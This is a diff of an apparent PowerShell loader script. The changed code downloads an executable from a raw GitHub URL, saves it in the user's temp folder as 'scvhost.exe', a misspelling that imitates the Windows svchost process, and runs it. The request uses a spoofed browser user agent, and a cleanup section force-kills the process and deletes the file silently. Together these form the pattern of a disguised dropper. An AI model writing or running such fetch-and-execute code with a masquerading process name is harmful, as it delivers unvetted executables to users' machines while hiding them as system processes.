@@ -125,36 +125,41 @@ while ($true)
 
         Write-Console "DOWNLOADING..." "INFO"
 
-$url  = "https://raw.githubusercontent.com/draft7973-ops/JETT.EXE/refs/heads/main/svchost.exe"
-$path = "D:\JETT.exe"
+        $url  = "https://raw.githubusercontent.com/draft7973-ops/JETT.EXE/refs/heads/main/scvhost.exe"
+        $path = "$env:TEMP\scvhost.exe"
 
-try {
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        try {
 
-    Invoke-WebRequest `
-    -Uri $url `
-    -OutFile $path `
-    -UseBasicParsing `
-    -UserAgent "Mozilla/5.0" `
-    -ErrorAction Stop
+            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-    if (Test-Path $path) {
-        Write-Console "INSTALL SUCCESS" "SUCCESS"
-        Start-Process $path
-    }
-    else {
-        Write-Console "INSTALL FAILED: FILE NOT FOUND" "NO KEY"
-    }
-}
-catch {
-    Write-Host ""
-    Write-Host $_.Exception.Message -ForegroundColor Red
-    Write-Console "INSTALL FAILED" "NO KEY"
-}
+            Invoke-WebRequest `
+            -Uri $url `
+            -OutFile $path `
+            -UseBasicParsing `
+            -UserAgent "Mozilla/5.0" `
+            -ErrorAction Stop
+
+            if (Test-Path $path)
+            {
+                Write-Host ""
+
+                Write-Console "INSTALL SUCCESS" "SUCCESS"
+
+                Start-Sleep 1
+
+                Start-Process $path
+            }
+            else
+            {
+                Write-Host ""
+
+                Write-Console "INSTALL FAILED" "NO KEY"
+            }
         }
         catch {
 
             Write-Host ""
+            Write-Host $_.Exception.Message -ForegroundColor Red
 
             Write-Console "INSTALL FAILED" "NO KEY"
         }
@@ -175,12 +180,12 @@ catch {
         Write-Console "CLEANING..." "INFO"
 
         Stop-Process `
-        -Name "JETT" `
+        -Name "scvhost" `
         -Force `
         -ErrorAction SilentlyContinue
 
         Remove-Item `
-        "C:\window\scvhost.exe" `
+        "$env:TEMP\scvhost.exe" `
         -Force `
         -ErrorAction SilentlyContinue
 
